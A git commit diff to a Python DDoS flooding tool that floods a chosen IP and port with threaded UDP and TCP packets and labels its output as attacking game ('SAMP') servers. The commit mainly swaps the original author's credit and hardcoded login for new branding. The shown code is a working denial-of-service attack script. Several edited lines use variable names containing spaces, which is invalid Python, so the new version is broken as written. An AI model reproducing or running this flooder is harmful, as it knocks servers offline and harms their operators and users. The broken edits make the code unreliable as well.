2e1e76e91b23de9eacef02001a9510f177834db3
CYBERCRACK404 <110366429+CYBERCRACK404@users.noreply.github.com>
2022-08-01 10:24:25 +0700

    Update DDOS-SERVER.py

--- DDOS-SERVER.py
+++ DDOS-SERVER.py
@@ -1,7 +1,6 @@
 #UDP/TCP TOOLS
-#Z1 DDOS TOOLS
-#MINIM KALO MAU RENAME JAN HAPUS CREDIT
-#Credit : Z1
+#KILLING TOOLS CYBER CRACK404
+#TOOLSING : CYBER CRACK404
 import random
 import socket
 import threading
@@ -22,28 +21,28 @@ nama =str(input("\033[97m[?] Username : "))
 password =str(input("\033[97m[$] Password : "))
 time.sleep(3)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m•••\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m•••\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m•\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m•\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m•••\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m•••\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m••\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m••\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-print("\033[97m[!] Wait A Moment [\033[95m•\033[97m] !!!")
+print("\033[97m[!] Loading [\033[95m•\033[97m] !!!")
 time.sleep(2)
 os.system("clear")
-if password == "zielx" and nama == "Z1":
+if password == "user" and nama == "user":
 	print("\033[97m[!] Login \033[92mSuccessful \033[97m!!!")
 	time.sleep(3)
 else:
@@ -62,17 +61,17 @@ print(f"""\033[96m    ) (       (         )
 ==========================
 
 \033[97m [!] Methods : \033[95mUDP | TCP
-\033[97m [!] Discord : \033[95mZ1#7872
-\033[97m [!] Team : \033[95m?
+\033[97m [!] Discord : \033[95m NOT CRACK 404
+\033[97m [!] Team : \033[95m CRACKING TOOLS 404
 
 \033[96m==========================
 """)
 
-dick =str(input("\033[97m[!] Z1 | Methods » \033[91m"))
-ip =str(input("\033[97m[!] Z1 | Ip » \033[91m"))
-port =int(input("\033[97m[!] Z1 | Port » \033[91m"))
-times =int(input("\033[97m[!] Z1 | Packets » \033[91m"))
-threads =int(input("\033[97m[!] Z1 | Threads » \033[91m"))
+dick =str(input("\033[97m[!] UDP|TCP | Methods » \033[91m"))
+ip server attack =str(input("\033[97m[!] CYBER CRACK404 | Ip » \033[91m"))
+port server attack =int(input("\033[97m[!] CYBER CRACK404 | Port » \033[91m"))
+times =int(input("\033[97m[!] CYBER CRACK404 | Packets » \033[91m"))
+threads attack=int(input("\033[97m[!] CYBER CRACK404 | Threads » \033[91m"))
 
 def udp():
 	data = os.urandom(65500)
@@ -83,9 +82,9 @@ def udp():
 			addr =(str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(i +" \033[96mAttack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+				print(i +" \033[96mATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 		except:
-				print("\033[95m[!] \033[96mAttack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+				print("\033[95m[!] \033[96mATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 				
 def udp2():
 				data = os.urandom(65500)
@@ -96,9 +95,9 @@ def udp2():
 						addr =(str(ip),int(port))
 						for x in range(times):
 							s.sendto(data,addr)
-							print(i +"\033[96m Attack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+							print(i +"\033[96m ATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 					except:
-						print("\033[95m[!]\033[96m Attack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+						print("\033[95m[!]\033[96m ATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 						
 def tcp():
 				data = os.urandom(20179)
@@ -110,10 +109,10 @@ def tcp():
 						s.send(data)
 						for x in range(times):
 							s.send(data)
-							print(i +"\033[96m Attack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+							print(i +"\033[96m ATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 					except:
 						s.close()
-						print("\033[95m[!]\033[96m Attack Launch To Ip = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
+						print("\033[95m[!]\033[96m ATTACKING SERVER SAMP = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
 						
 for y in range(threads):
 				if dick == 'UDP':
